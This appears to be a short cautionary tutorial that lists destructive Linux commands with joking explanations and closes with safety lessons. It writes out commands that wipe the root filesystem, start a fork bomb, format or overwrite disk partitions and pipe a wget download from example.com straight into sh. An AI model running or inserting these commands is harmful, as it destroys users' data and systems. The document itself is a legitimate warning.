Suicide Linux
============

*Simple list of deadly linux commands. All the Linux that nobody will teach you, but that you will experience in first person. At least one time in your life.*

## Warning
Most of the commands in this tutorial are **really dangerous**!!!
DO NOT use these commands on a real system if you have no idea of what you are going to do.


### Delete Everything!

`rm -fr /`

With this command you asking to delete every files in your disk. Your only hope is that some security control will denied you to do something so silly.


### Fork Bomb

`:(){ :|: & };:`

Elegant and deadly as a dark-lady. This short shell script replicates itself until all the processing capabilities of your computer will be occupied. Shutdown and restart seems to be the only solution.


### Format the Drive

`mkfs.ext4 /dev/sda1`

Do you remember `format C:` of the old DOS? this have the same result.

### Write in the Wrong Place

`date > /dev/sda`

Redirecting will write raw bytes on your disk partition. What can never will be? nothing good! surely.


## Collect Junk is a Dirty Job

`dd if=/dev/random of=/dev/sda`


## The Black Hole

`mv ~ /dev/null`

This command will move all your personal data in the Linux equivalent of a Black Hole.


## stranger danger

`wget http://example.com/something -O – | sh –`


## You will be no more busy

`rm -f /usr/sbin/busybox`

## Learned Lessons
* execute commands with root privileges only if it is strictly necessary
* beware from `rm -r` commands
* never handle partions handles (such as `/dev/sda1`)
* never execute untrusted content


## References
* [How to Geek](http://www.howtogeek.com/125157/8-deadly-commands-you-should-never-run-on-linux/)
